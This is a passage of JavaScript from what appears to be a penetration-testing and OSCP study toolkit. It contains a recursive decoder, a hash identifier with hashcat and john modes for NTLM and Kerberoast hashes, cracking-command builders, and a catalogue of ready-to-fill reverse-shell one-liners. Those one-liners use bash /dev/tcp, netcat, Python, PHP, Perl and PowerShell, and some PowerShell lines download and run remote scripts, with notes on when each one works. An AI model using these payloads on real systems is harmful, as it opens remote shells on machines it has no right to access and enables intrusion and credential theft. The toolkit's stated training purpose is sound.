  var _WORDS = /\b(the|and|for|you|are|with|this|that|from|have|not|true|false|null|password|passwd|admin|administrator|user|username|login|flag|secret|key|token|bearer|http|https|root|pass|welcome|error|success|cookie|session|email|bash|sh|whoami|id|cat|curl|wget|nc|python|python3|powershell|iex|select|union|where|from|table|exec|system|cmd)\b/gi;
  function scoreBytes(bytes) {
    if (!bytes.length) return -1;
    var pr = printableRatio(bytes), txt = u8Text(bytes), trimmed = txt.trim(), s = pr * 100;
    if (/\b(flag|HTB|THM|FLAG|picoCTF|CTF)\{[^}]*\}/i.test(txt)) s += 150;
    if (/^\s*[{\[][\s\S]*[}\]]\s*$/.test(txt)) { try { JSON.parse(txt); s += 60; } catch (e) { s += 8; } }
    if (/"alg"\s*:/.test(txt) || /"typ"\s*:\s*"JWT"/i.test(txt)) s += 40;
    if (/https?:\/\/\S+/i.test(txt)) s += 25;
    if (/\/(?:etc|bin|usr|var|tmp|dev|home|root)\/\S+/i.test(txt)) s += 35;
    if (/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/.test(txt)) s += 25;
    var w = (txt.match(_WORDS) || []).length; s += Math.min(w, 8) * 10;
    if (/�/.test(txt)) s -= 25;
    for (var i = 0; i < bytes.length; i++) { if (bytes[i] === 0) { s -= 30; break; } }
    if (pr > 0.9 && /\s/.test(txt)) s += 10;
    // Penalize strings that still look like an unpeeled encoding layer
    if (/^[0-9a-fA-F]{4,}$/.test(trimmed) && trimmed.length % 2 === 0) s -= 28;
    else if (/%[0-9a-fA-F]{2}/.test(trimmed)) s -= 24;
    else if (/^[01\s]{16,}$/.test(trimmed)) s -= 30;
    else if (/^\d{1,3}([\s,]+\d{1,3}){2,}$/.test(trimmed)) s -= 26;
    else if (/^[A-Za-z0-9+/]+={1,2}$/.test(trimmed) && trimmed.length % 4 === 0) s -= 24;
    else if (/^[A-Za-z0-9+/]{8,}$/.test(trimmed) && trimmed.length % 4 === 0 && /[0-9+/]/.test(trimmed) && !/\s/.test(trimmed)) s -= 18;
    return s;
  }
  W.scoreText = function (x) { return scoreBytes(toU8(x)); };

  // Recursive "decode to completion": BFS over applicable decodes (applies() keeps branching tight),
  // bounded by depth + a node budget, deduped, scoring every node and returning the best one with its
  // full chain and step-by-step intermediate values.
  W.smartDecode = function (input, opts) {
    opts = opts || {};
    var maxDepth = opts.maxDepth || 8, budget = opts.budget || 300;
    var rawStr = (typeof input === 'string') ? input : u8Text(toU8(input));
    var un = W.unwrapShellWrapper(rawStr);
    var initChain = un.unwrapped ? ['wrapper'] : [];
    var initSteps = un.unwrapped ? [{ id: 'wrapper', codec: un.label, label: un.label, text: un.payload }] : [];
    var root = toU8(un.payload), rootScore = scoreBytes(root);
    var best = { bytes: root, score: rootScore, chain: initChain, steps: initSteps };
    var seen = {}; seen[u8Ascii(root)] = 1;
    var queue = [{ bytes: root, chain: initChain, steps: initSteps, depth: 0 }], nodes = 0;
    function step() {
      while (queue.length && nodes < budget) {
        var node = queue.shift(); nodes++;
        var ci = 0;
        var applicable = [];
        for (ci = 0; ci < AUTO.length; ci++) { try { if (AUTO[ci].applies(node.bytes)) applicable.push(AUTO[ci]); } catch (e) {} }
        if (!applicable.length) continue;
        return Promise.all(applicable.map(function (codec) {
          var r; try { r = codec.decode(node.bytes); } catch (e) { r = null; }
          return Promise.resolve(r).then(function (res) { return { codec: codec, res: res }; }, function () { return { codec: codec, res: null }; });
        })).then(function (results) {
          results.forEach(function (rc) {
            var res = rc.res; if (!res || !res.length) return;
            var key = u8Ascii(res); if (seen[key]) return; seen[key] = 1;
            var pr = printableRatio(res);
            var txt = u8Text(res);
            var sc = scoreBytes(res) + (pr >= 0.95 && txt.indexOf('\uFFFD') < 0 ? (node.depth + 1) * 8 : 0);
            var chain = node.chain.concat([rc.codec.id]);
            var steps = node.steps.concat([{ id: rc.codec.id, codec: rc.codec.label, label: rc.codec.label, text: txt }]);
            if (sc > best.score) best = { bytes: res, score: sc, chain: chain, steps: steps };
            if (node.depth + 1 < maxDepth) queue.push({ bytes: res, chain: chain, steps: steps, depth: node.depth + 1 });
          });
          return step();
        });
      }
      return Promise.resolve();
    }
    return step().then(function () {
      var realChain = best.chain.filter(function (id) { return id !== 'wrapper'; });
      var improved = realChain.length > 0 && best.score > rootScore + 4 && printableRatio(best.bytes) >= 0.8;
      return {
        input: rawStr,
        found: improved,
        best: {
          text: u8Text(best.bytes),
          chain: best.chain.map(labelFor),
          chainIds: best.chain,
          steps: best.steps,
          unwrapped: un.unwrapped,
          wrapperLabel: un.label,
          printable: printableRatio(best.bytes),
          score: best.score
        },
        rootScore: rootScore,
        nodes: nodes,
      };
    });
  };
  function labelFor(id) {
    if (id === 'wrapper') return 'Command Wrapper';
    var c = codecById(id); return c ? c.label : id;
  }

  // "Try every decoding at once": one layer, every codec that either applies or yields mostly-printable
  // output, sorted so the readable results float to the top. Async for the compression codecs.
  W.decodeAllOnce = function (input) {
    var un = W.unwrapShellWrapper(input);
    var bytes = toU8(un.payload), base = u8Text(bytes);
    return Promise.all(CODECS.map(function (c) {
      if (!c.decode) return Promise.resolve(null);
      var r; try { r = c.decode(bytes); } catch (e) { r = null; }
      return Promise.resolve(r).then(function (res) {
        if (!res || !res.length) return null;
        var txt = u8Text(res); if (txt === base) return null;
        var pr = printableRatio(res), applies = false;
        try { applies = c.applies ? c.applies(bytes) : false; } catch (e) {}
        if (!applies && pr < 0.75) return null;
        return { id: c.id, label: c.label + (un.unwrapped ? (' (after unwrapping ' + un.label + ')') : ''), text: txt, printable: pr, applies: applies };
      }, function () { return null; });
    })).then(function (list) {
      return list.filter(Boolean).sort(function (a, b) { return (b.applies - a.applies) || (b.printable - a.printable); });
    });
  };

  // Manual: run ONE codec in ONE direction (the power-user "try it yourself" fields). No guards; it
  // reports whatever comes out, or a plain reason it could not.
  W.runCodec = function (id, dir, text) {
    var c = codecById(id);
    if (!c) return Promise.resolve({ ok: false, error: 'unknown codec' });
    try {
      if (dir === 'encode') {
        if (!c.encode) return Promise.resolve({ ok: false, error: 'no encoder for ' + c.label });
        return Promise.resolve(c.encode(String(text == null ? '' : text))).then(function (e) { return e == null ? { ok: false, error: 'could not encode' } : { ok: true, out: e }; }, function (e) { return { ok: false, error: String(e && e.message || e) }; });
      }
      return Promise.resolve(c.decode(toU8(text))).then(function (r) { return r == null ? { ok: false, error: 'input is not valid ' + c.label } : { ok: true, out: u8Text(r) }; }, function (e) { return { ok: false, error: String(e && e.message || e) }; });
    } catch (e) { return Promise.resolve({ ok: false, error: String(e && e.message || e) }); }
  };

  // Every encoding of an input, for the Encoder tab (async: gzip/zlib go through the streams).
  W.encodeAll = function (text) {
    return Promise.all(CODECS.map(function (c) {
      if (!c.encode) return Promise.resolve(null);
      return Promise.resolve().then(function () { return c.encode(String(text == null ? '' : text)); }).then(function (out) { return out == null ? null : { id: c.id, label: c.label, note: c.note, out: out }; }, function () { return null; });
    })).then(function (list) { return list.filter(Boolean); });
  };

  // ── reverse-shell catalogue ─────────────────────────────────────────────────────────────────
  // Templates use {{lhost}} and {{lport}}. `os` groups them for the UI. `enc` flags which encodings
  // make sense to offer for that payload (b64 for Linux shells, psenc for PowerShell). The note is for
  // a learner: when this one works and what to watch for.
  W.REVSHELLS = [
    {
      id: 'bash-i', name: 'Bash -i', os: 'linux', enc: ['b64'],
      tpl: 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1',
      note: 'The classic. Needs a real bash (not dash). If it hangs with no connection, the box may not have /dev/tcp, so try the mkfifo or Python form.',
    },
    {
      id: 'bash-196', name: 'Bash 196 (read line)', os: 'linux', enc: ['b64'],
      tpl: '0<&196;exec 196<>/dev/tcp/{{lhost}}/{{lport}}; sh <&196 >&196 2>&196',
      note: 'An alternate /dev/tcp form that sometimes works when "bash -i" does not.',
    },
    {
      id: 'sh-tcp', name: 'sh (/dev/tcp)', os: 'linux', enc: ['b64'],
      tpl: 'sh -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1',
      note: 'For boxes whose default shell is dash/sh. Same idea as bash -i.',
    },
    {
      id: 'nc-mkfifo', name: 'nc (mkfifo)', os: 'linux', enc: ['b64'],
      tpl: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{lhost}} {{lport}} >/tmp/f',
      note: 'Portable: works with the stripped nc that has no -e. The go-to when the box has netcat but /dev/tcp is missing.',
    },
    {
      id: 'nc-e', name: 'nc -e', os: 'linux', enc: ['b64'],
      tpl: 'nc {{lhost}} {{lport}} -e /bin/sh',
      note: 'Only works if netcat was built with -e (the "traditional" nc). Many modern boxes strip it, so keep mkfifo ready.',
    },
    {
      id: 'ncat-ssl', name: 'ncat (TLS)', os: 'linux', enc: ['b64'],
      tpl: 'ncat --ssl {{lhost}} {{lport}} -e /bin/bash',
      note: 'Encrypted shell with ncat on both ends. Start the listener with: ncat --ssl -lvnp {{lport}}.',
    },
    {
      id: 'python3', name: 'Python 3', os: 'linux', enc: ['b64'],
      tpl: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{lhost}}",{{lport}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")\'',
      note: 'Very reliable on Linux and gives you a PTY straight away (less need for the manual upgrade). Try python2/python if python3 is absent.',
    },
    {
      id: 'php', name: 'PHP', os: 'linux', enc: ['b64'],
      tpl: 'php -r \'$sock=fsockopen("{{lhost}}",{{lport}});exec("/bin/sh -i <&3 >&3 2>&3");\'',
      note: 'For a box with PHP on the path (web servers). If exec is disabled, try the system/passthru variants.',
    },
    {
      id: 'perl', name: 'Perl', os: 'linux', enc: ['b64'],
      tpl: 'perl -e \'use Socket;$i="{{lhost}}";$p={{lport}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
      note: 'Perl is on almost every Linux box. A dependable fallback when bash and python are awkward.',
    },
    {
      id: 'ruby', name: 'Ruby', os: 'linux', enc: ['b64'],
      tpl: 'ruby -rsocket -e\'f=TCPSocket.open("{{lhost}}",{{lport}}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
      note: 'For boxes with Ruby (rails apps, some appliances).',
    },
    {
      id: 'socat', name: 'socat (PTY)', os: 'linux', enc: ['b64'],
      tpl: 'socat TCP:{{lhost}}:{{lport}} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane',
      note: 'The nicest Linux shell if socat is present on BOTH ends. Listener: socat file:`tty`,raw,echo=0 TCP-LISTEN:{{lport}}.',
    },
    {
      id: 'awk', name: 'awk', os: 'linux', enc: ['b64'],
      tpl: 'awk \'BEGIN {s = "/inet/tcp/0/{{lhost}}/{{lport}}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null',
      note: 'A last-resort shell on a minimal box that still has awk. Simple line-based, no job control.',
    },
    {
      id: 'ps-tcp', name: 'PowerShell (TCP)', os: 'windows', enc: ['psenc'],
      tpl: '$client = New-Object System.Net.Sockets.TCPClient("{{lhost}}",{{lport}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
      note: 'The standard Windows one-liner. Use the Base64 (-EncodedCommand) toggle so quoting and bad characters cannot break it, which is exactly how OffSec teaches it for the OSCP.',
    },
    {
      id: 'ps-iex-download', name: 'PowerShell (download + IEX)', os: 'windows', enc: ['psenc'],
      tpl: 'IEX(New-Object Net.WebClient).DownloadString("http://{{lhost}}:{{lport}}/shell.ps1")',
      note: 'Fetches and runs a script you serve from Kali. Pair with a web server (python3 -m http.server {{lport}}) and your own shell.ps1, not a reverse-shell listener.',
    },
    {
      id: 'cmd-nc', name: 'Windows nc.exe', os: 'windows', enc: [],
      tpl: 'nc.exe {{lhost}} {{lport}} -e cmd.exe',
      note: 'Needs nc.exe staged on the target first (serve it from Kali, download it, then run). A plain cmd shell, no PowerShell.',
    },
    {
      id: 'nodejs', name: 'Node.js', os: 'linux', enc: ['b64'],
      tpl: 'node -e \'(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({{lport}},"{{lhost}}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\'',
      note: 'For Node.js / Express web apps or Electron containers where node is in PATH.',
    },
    {
      id: 'powercat', name: 'PowerShell (powercat)', os: 'windows', enc: ['psenc'],
      tpl: 'IEX(New-Object System.Net.WebClient).DownloadString("http://{{lhost}}:8000/powercat.ps1");powercat -c {{lhost}} -p {{lport}} -e cmd',
      note: 'Serve powercat.ps1 on port 8000 (from /usr/share/powershell-empire/ or Kali). Very reliable when raw socket scripts get flagged.',
    },
    {
      id: 'conpty', name: 'Windows ConPTY (Interactive)', os: 'windows', enc: ['psenc'],
      tpl: 'IEX(IWR http://{{lhost}}:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {{lhost}} {{lport}}',
      note: 'Upgrades a Windows reverse shell to a full interactive console with tab-completion and arrow keys. Catch with: stty raw -echo; (stty size; cat) | nc -lvnp {{lport}}',
    },
  ];

  // ── hash identifier ─────────────────────────────────────────────────────────────────────────
  // Deterministic, rule-based (like hashid / name-that-hash), so it stays exam-legal: no guessing
  // model, just structure. Each rule yields {name, mode (hashcat -m, or null), john, note}. Structured
  // prefixes are unambiguous; bare hex is ranked by OSCP-likelihood with the alternatives shown, because
  // a 32-char hex string is genuinely NTLM or MD5 and only context tells which.
  function hc(name, mode, john, note) { return { name: name, mode: mode, john: john, note: note || '' }; }

  var HASH_PREFIX_RULES = [
    { re: /^\$2[abxy]\$\d{2}\$[./A-Za-z0-9]{53}$/, c: [hc('bcrypt', 3200, 'bcrypt', 'Slow by design. CrackStation will not help, crack offline with a good wordlist and patience.')] },
    { re: /^\$6\$/, c: [hc('sha512crypt (Linux /etc/shadow)', 1800, 'sha512crypt', 'A Linux shadow hash. Slow. Offline wordlist crack only.')] },
    { re: /^\$5\$/, c: [hc('sha256crypt (Linux /etc/shadow)', 7400, 'sha256crypt', 'A Linux shadow hash. Slow. Offline wordlist crack only.')] },
    { re: /^\$1\$/, c: [hc('md5crypt (Linux /etc/shadow)', 500, 'md5crypt', 'Old Linux shadow hash. Slow, salted. Offline crack.')] },
    { re: /^\$apr1\$/, c: [hc('Apache md5apr1 (.htpasswd)', 1600, 'md5crypt', 'Apache htpasswd MD5. Salted. Offline crack.')] },
    { re: /^\$(P|H)\$/, c: [hc('phpass (WordPress / phpBB / Joomla)', 400, 'phpass', 'The CMS hash family. Salted and stretched. Offline crack.')] },
    { re: /^\{SSHA\}/, c: [hc('LDAP {SSHA} (salted SHA-1)', 111, 'ssha', 'Common in LDAP directories. Salted.')] },
    { re: /^\{SHA\}/, c: [hc('LDAP {SHA} (base64 SHA-1)', 101, 'nsldap', 'Unsalted base64 SHA-1. CrackStation may know it.')] },
    { re: /^\$krb5asrep\$(23)\$/i, c: [hc('Kerberos AS-REP (RC4)', 18200, 'krb5asrep', 'From AS-REP roasting (a user with "do not require preauth"). RC4, fast to crack. Try a wordlist first.')] },
    { re: /^\$krb5asrep\$(17|18)\$/i, c: [hc('Kerberos AS-REP (AES)', null, 'krb5asrep', 'An AES AS-REP (etype 17/18). AS-REP roasting is almost always RC4 (mode 18200); hashcat has no AES AS-REP mode, so crack this with john --format=krb5asrep. Rare in practice.')] },
    { re: /^\$krb5tgs\$23\$/i, c: [hc('Kerberoast TGS-REP (RC4)', 13100, 'krb5tgs', 'From Kerberoasting a service account. RC4, fast. Service accounts often have weak passwords, so this is high value.')] },
    { re: /^\$krb5tgs\$17\$/i, c: [hc('Kerberoast TGS-REP (AES128)', 19600, 'krb5tgs', 'AES128 Kerberoast. Slower than RC4. Offline wordlist crack.')] },
    { re: /^\$krb5tgs\$18\$/i, c: [hc('Kerberoast TGS-REP (AES256)', 19700, 'krb5tgs', 'AES256 Kerberoast. Slower than RC4. Offline wordlist crack.')] },
    { re: /^\$DCC2\$/i, c: [hc('Domain Cached Credentials 2 (mscash2)', 2100, 'mscash2', 'Cached domain logon from a workstation. Very slow. Low iteration wordlist only.')] },
    { re: /^\$krb5pa\$23\$/i, c: [hc('Kerberos pre-auth (RC4, PA-ENC-TIMESTAMP)', 7500, 'krb5pa-md5', 'From sniffed AS-REQ pre-auth. RC4, fast to crack.')] },
    { re: /^\$krb5pa\$17\$/i, c: [hc('Kerberos pre-auth (AES128, PA-ENC-TIMESTAMP)', 19800, 'krb5pa-sha1', 'AES128 pre-auth (etype 17). Offline wordlist crack.')] },
    { re: /^\$krb5pa\$18\$/i, c: [hc('Kerberos pre-auth (AES256, PA-ENC-TIMESTAMP)', 19900, 'krb5pa-sha1', 'AES256 pre-auth (etype 18). Offline wordlist crack.')] },
    { re: /^\$krb5pa\$/i, c: [hc('Kerberos pre-auth (PA-ENC-TIMESTAMP)', 7500, 'krb5pa-md5', 'From sniffed pre-auth. The etype (second field) sets the mode: 23 RC4 is 7500, 17/18 AES are 19800/19900.')] },
    { re: /^0x0100[0-9a-f]+$/i, c: [hc('MSSQL 2000', 131, 'mssql', 'Legacy SQL Server hash.')] },
    { re: /^0x0200[0-9a-f]+$/i, c: [hc('MSSQL 2012 / 2014+', 1731, 'mssql12', 'Modern SQL Server hash (SHA-512 based).')] },
    { re: /^\*[A-F0-9]{40}$/i, c: [hc('MySQL 4.1+ (SHA1(SHA1(pw)))', 300, 'mysql-sha1', 'The leading * marks it. Unsalted, fast.')] },
    { re: /^[^:\s]+::[^:]*:[0-9a-f]{16}:[0-9a-f]{32}:[0-9a-f]+$/i, c: [hc('NetNTLMv2 (Responder / relay capture)', 5600, 'netntlmv2', 'Captured off the wire by Responder or an SMB relay. Crack it offline, or relay it live instead.')] },
    { re: /^[^:\s]+::[^:]*:[0-9a-f]{48}:[0-9a-f]{48}:[0-9a-f]{16}$/i, c: [hc('NetNTLMv1 (Responder capture)', 5500, 'netntlm', 'The v1 capture. Can sometimes be cracked to NTLM via rainbow tables (crack.sh).')] },
    { re: /^\$argon2[id]{1,2}\$/i, c: [hc('Argon2', null, 'argon2', 'Modern, memory-hard. hashcat has no stable mode; use john --format=argon2. Expect it to be slow.')] },
    { re: /^\$y\$/, c: [hc('yescrypt (modern Linux /etc/shadow)', null, 'crypt', 'Default on recent Debian/Ubuntu. hashcat has no mode yet; use john. Very slow.')] },
    // ── structured application / file / network formats: unambiguous prefixes, so they identify exactly ──
    { re: /^\$keepass\$/i, c: [hc('KeePass (1.x / 2.x database)', 13400, 'keepass', 'A KeePass master key. Slow by design. Offline wordlist crack only.')] },
    { re: /^\$7z\$/i, c: [hc('7-Zip archive', 11600, '7z', 'The archive password. Slow, memory-hard. Offline crack.')] },
    { re: /^\$RAR3\$/i, c: [hc('RAR3 archive', 12500, 'rar3', 'WinRAR 3.x password. Slow. Offline crack.')] },
    { re: /^\$rar5\$/i, c: [hc('RAR5 archive', 13000, 'rar5', 'WinRAR 5.x password. Slow. Offline crack.')] },
    { re: /^\$office\$\*?2007/i, c: [hc('MS Office 2007 document', 9400, 'office2007', 'Office 2007 encryption. Offline wordlist crack.')] },
    { re: /^\$office\$\*?2010/i, c: [hc('MS Office 2010 document', 9500, 'office2010', 'Office 2010 encryption. Slower than 2007.')] },
    { re: /^\$office\$\*?2013/i, c: [hc('MS Office 2013+ document', 9600, 'office2013', 'Office 2013+ encryption. 100k iterations, slow.')] },
    { re: /^\$pdf\$/i, c: [hc('PDF document', 10500, 'pdf', 'Encrypted PDF. For Acrobat 1.7 (revision 6) the mode is 10700 instead; the $pdf$V*R* fields tell you (R=6 is 1.7).')] },
    { re: /^\$zip2\$/i, c: [hc('WinZip (AES) archive', 13600, 'zip2', 'WinZip AES. Offline crack.')] },
    { re: /^\$pkzip2?\$/i, c: [hc('PKZIP / legacy ZIP archive', 17200, 'pkzip', 'Legacy ZIP. The exact mode varies by layout (17210 uncompressed, 17225 mixed); 17200 is the common compressed case.')] },
    { re: /^\$sshng\$/i, c: [hc('SSH private key (encrypted)', 22911, 'sshng', 'A passphrase-protected id_rsa / id_ed25519. The subtype sets the exact mode (22911 RSA/DSA up to 22951); start here.')] },
    { re: /^pbkdf2_sha256\$/i, c: [hc('Django (PBKDF2-SHA256)', 10000, 'django', 'Django web framework password. Stretched, slow.')] },
    { re: /^\$S\$[./0-9A-Za-z]{52}$/, c: [hc('Drupal 7 (SHA-512, stretched)', 7900, 'drupal7', 'Drupal 7 CMS password. Salted and stretched. Offline crack.')] },
    { re: /^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/, c: [hc('JWT (JSON Web Token, HMAC-signed)', 16500, 'jwt', 'A signed token. Crack the HMAC secret to forge your own; a weak secret falls fast. States only the secret, not a password.')] },
    { re: /^WPA\*0[12]\*/i, c: [hc('WPA / WPA2 (PMKID or EAPOL)', 22000, 'wpa-pbkdf2-pmkid+eapol', 'Captured Wi-Fi handshake or PMKID. Offline wordlist crack.')] },
    { re: /^S:[0-9A-Fa-f]{60}$/, c: [hc('Oracle 11g (SHA-1, salted)', 112, 'oracle11g', 'From DBA_USERS.SPARE4. Salted SHA-1. Offline crack.')] },
    { re: /^md5[0-9a-f]{32}$/, c: [hc('PostgreSQL (md5 of password + username)', 12, 'postgres', 'The pg_shadow md5 form. The salt is the username; supply it as hash:username.')] },
    { re: /^[./0-9A-Za-z]{13}$/, c: [hc('descrypt (traditional Unix DES crypt)', 1500, 'descrypt', 'A 13-character classic Unix crypt hash. Old and rare now, but still seen on legacy boxes. Only the first 8 password characters matter.')] },
  ];

  // pwdump / secretsdump line: user:rid:LM:NT:::  → identify the NT (and flag the LM if not blank).
  var PWDUMP_RE = /^[^:\s]+:\d+:([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::\s*$/;
  var LM_EMPTY = 'aad3b435b51404eeaad3b435b51404ee';

  function hexCandidates(len) {
    switch (len) {
      case 16: return [hc('MySQL < 4.1 (MySQL323)', 200, 'mysql', 'Very old MySQL. Unsalted.'), hc('Half-LM / DES fragment', 3000, 'lm', 'Could be half of an LM hash.')];
      case 32: return [hc('NTLM (Windows account hash)', 1000, 'nt', 'If it came from a Windows / AD dump, this is almost certainly NTLM. Unsalted and fast, and usable directly in pass-the-hash without cracking.'), hc('MD5', 0, 'raw-md5', 'If it came from a web app or database, MD5 is likely. Unsalted, so CrackStation may already know it.'), hc('MD4', 900, 'raw-md4', 'Less common.')];
      case 40: return [hc('SHA-1', 100, 'raw-sha1', 'Unsalted. CrackStation may know it. Check for a leading * (that would make it MySQL).')];
      case 56: return [hc('SHA-224', 1300, 'raw-sha224', 'Unsalted.')];
      case 64: return [hc('SHA-256', 1400, 'raw-sha256', 'Unsalted. CrackStation may know it.'), hc('SHA3-256 / Keccak-256', 17400, 'raw-keccak', 'Less common.')];
      case 96: return [hc('SHA-384', 10800, 'raw-sha384', 'Unsalted.')];
      case 128: return [hc('SHA-512', 1700, 'raw-sha512', 'Unsalted. CrackStation may know it.'), hc('Whirlpool', 6100, 'whirlpool', 'Less common.')];
      default: return [];
    }
  }

  // Identify a single hash string. Returns {input, candidates:[...], lm?:bool, note?}.
  W.identifyHash = function (raw) {
    var s = String(raw == null ? '' : raw).trim();
    if (!s) return { input: '', candidates: [] };

    var pd = s.match(PWDUMP_RE);
    if (pd) {
      var out = { input: s, candidates: [hc('NTLM (from a pwdump / secretsdump line)', 1000, 'nt', 'The 4th field is the NT hash. Use it directly for pass-the-hash, or crack it. Feed just the 32-hex NT hash to hashcat.')], nt: pd[2].toLowerCase() };
      if (pd[1].toLowerCase() !== LM_EMPTY) out.candidates.push(hc('LM (the 3rd field is set)', 3000, 'lm', 'The LM half is present (not the empty AAD3B4... value). LM is weak and worth cracking fast.'));
      return out;
    }

    for (var i = 0; i < HASH_PREFIX_RULES.length; i++) {
      if (HASH_PREFIX_RULES[i].re.test(s)) return { input: s, candidates: HASH_PREFIX_RULES[i].c.slice() };
    }

    if (/^[0-9a-fA-F]+$/.test(s)) {
      var cands = hexCandidates(s.length);
      if (cands.length) return { input: s, candidates: cands };
      return { input: s, candidates: [], note: 'A ' + s.length + '-character hex string that does not match a common length. Paste it into the hashcat example-hashes wiki to compare.' };
    }
    return { input: s, candidates: [], note: 'No confident match. Compare it against the hashcat example-hashes wiki, or try name-that-hash locally.' };
  };

  // normalizeHash(raw) -> { input, cleaned, changed, changes[] }. DETERMINISTIC, transparent cleanup of the
  // formatting pitfalls that make a perfectly good hash fail to crack in a lab: stray whitespace and CRLF,
  // surrounding quotes, a capture-log prefix, a $NT$ prefix, a full secretsdump line (keep the NT hash), and
  // a Kerberos ticket that wrapped across lines (Rubeus loves to do this). It NEVER reorders fields, changes
  // an etype, or drops a ticket's SPN section: those could corrupt a valid hash, so they are left alone. Every
  // change is recorded in `changes` so the UI can show exactly what it did (honest by construction, like the
  // parser's Explain Output). A hash that is already clean comes back changed:false with cleaned === input.
  W.normalizeHash = function (raw) {
    var original = String(raw == null ? '' : raw);
    var s = original;
    var changes = [];

    var trimmed = s.replace(/\r/g, '').replace(/^\s+|\s+$/g, '');
    if (trimmed !== original) changes.push('Trimmed surrounding whitespace.');
    s = trimmed;

    var q = s.match(/^(["'])([\s\S]*)\1$/);
    if (q) { s = q[2]; changes.push('Removed the surrounding quotes.'); }

    // a Responder / capture log line: "[SMB] NTLMv2-SSP Hash : user::DOMAIN:..." -> keep the hash
    var rp = s.match(/^\[[^\]]*\][^:]*?Hash\s*:\s*([\s\S]+)$/i);
    if (rp) { s = rp[1].trim(); changes.push('Removed the capture-log prefix, kept the hash.'); }

    // a full secretsdump / pwdump line -> the NT hash (4th field), which is what -m 1000 wants
    var username = '';
    var pd = s.match(PWDUMP_RE);
    if (pd) {
      username = s.split(':')[0] || '';
      s = pd[2];
      changes.push('Took the NT hash (4th field) from the secretsdump line.');
    }

    // a Linux /etc/shadow line or user:hash pair (not NetNTLMv1/v2 ::, not Oracle S:, not $krb5)
    var sh = !pd && s.match(/^([a-zA-Z0-9_.\\$-]{2,48}):(\$[1256yabxyPHS]+\$[^\s:]+|[0-9a-fA-F]{32,128})(?::\d*:\d*:\d*:\d*:\d*:\d*:[^\s:]*)?$/);
    if (sh && sh[1] !== 'S' && !/^[0-9a-fA-F]{32}$/.test(sh[1])) {
      username = sh[1];
      s = sh[2];
      changes.push('Stripped the username prefix (' + username + ':) and trailing shadow fields.');
    }

    if (/^\$NT\$/i.test(s)) { s = s.replace(/^\$NT\$/i, ''); changes.push('Removed the $NT$ prefix.'); }

    // a Kerberos ticket wrapped across lines (or with internal whitespace) -> one line; hashcat needs it joined
    if (/^\$krb5(tgs|asrep|pa)\$/i.test(s) && /\s/.test(s)) {
      s = s.replace(/\s+/g, '');
      changes.push('Joined the Kerberos ticket into one line (removed the line wraps).');
    }

    return { input: original, cleaned: s, clean: s, changed: changes.length > 0, changes: changes, username: username };
  };

  // The hashcat crack command for a candidate (canonical rockyou path; the Loadout rewrite can retarget it).
  W.hashcatCmd = function (mode, hashfile, wordlist) {
    if (mode == null) return null;
    hashfile = hashfile || 'hash.txt';
    wordlist = wordlist || '/usr/share/wordlists/rockyou.txt';
    return 'hashcat -m ' + mode + ' ' + hashfile + ' ' + wordlist;
  };
  W.johnCmd = function (format, hashfile, wordlist) {
    if (!format) return null;
    hashfile = hashfile || 'hash.txt';
    wordlist = wordlist || '/usr/share/wordlists/rockyou.txt';
    return 'john --format=' + format + ' --wordlist=' + wordlist + ' ' + hashfile;
  };

  W.revShell = function (id) {
    for (var i = 0; i < W.REVSHELLS.length; i++) if (W.REVSHELLS[i].id === id) return W.REVSHELLS[i];
    return null;
  };

  // Substitute {{lhost}}/{{lport}} in a template. Missing values stay visible as the token so the gap
  // is obvious rather than silently producing a broken command.
  W.fill = function (tpl, vals) {
    vals = vals || {};
    var lhost = (vals.lhost != null && vals.lhost !== '') ? vals.lhost : '{{lhost}}';
    var lport = (vals.lport != null && vals.lport !== '') ? vals.lport : '{{lport}}';
    return String(tpl == null ? '' : tpl).split('{{lhost}}').join(lhost).split('{{lport}}').join(lport);
  };

  // The listener that catches a given reverse shell. ncat/socat carry their own above; everything else
  // is a plain netcat listener on the chosen port.
  W.listenerFor = function (entry, vals) {
    var lport = (vals && vals.lport != null && vals.lport !== '') ? vals.lport : '{{lport}}';
    if (!entry) return 'nc -lvnp ' + lport;
    if (entry.id === 'ncat-ssl') return 'ncat --ssl -lvnp ' + lport;
    if (entry.id === 'socat') return 'socat file:`tty`,raw,echo=0 TCP-LISTEN:' + lport;
    if (entry.id === 'ps-iex-download') return 'python3 -m http.server ' + lport;
    return 'nc -lvnp ' + lport;
  };

  // ── wordlist picker ─────────────────────────────────────────────────────────────────────────
  // A curated map of "what am I attacking" to the right SecLists / rockyou file, with a plain note. Paths
  // are the standard Kali SecLists locations (the Loadout rewrite can retarget them per box). `tags` let a
  // detected stack (from web.tech facts, wired in P4) float the right list to the top.
  var SL = '/usr/share/seclists/';
  W.WORDLISTS = [
    // content discovery (directories/files)
